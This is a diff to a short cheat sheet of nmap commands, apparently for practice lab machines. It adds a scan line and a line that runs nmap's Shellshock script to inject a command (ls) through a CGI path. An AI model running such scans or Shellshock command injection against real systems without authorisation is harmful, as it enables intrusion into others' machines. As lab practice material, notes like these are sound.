@@ -5,7 +5,13 @@ sudo nmap -sV -sS 10.10.10.7
 
 Output scan to file:
 sudo nmap -sV -sS 10.10.10.7 -oN name.txt
+sudo nmap -sV -sS -A -oN start.txt 10.10.10.60
 
 
 Run vulnerability scripts on specific port:
 sudo nmap -sV -sS 10.10.10.7 -oN beep-80 -A -p80 --script vuln
+
+
+
+Run shellshock script:
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
